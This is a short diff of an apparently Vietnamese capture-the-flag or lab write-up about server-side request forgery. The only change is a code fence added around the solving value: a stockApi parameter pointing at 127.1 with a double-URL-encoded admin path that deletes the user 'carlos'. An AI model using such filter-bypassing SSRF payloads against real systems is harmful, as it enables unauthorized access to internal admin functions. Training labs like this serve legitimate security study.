@@ -21,6 +21,8 @@ Mình đã tiến hành encode url /admin 2 lần và web sẽ load được bì
 
 Ok sửa lại value thành như này là solve lab 
 
+```markdown
 **stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos**
+```
 
 ![](/imgs/CSRF/12.png?raw=true)
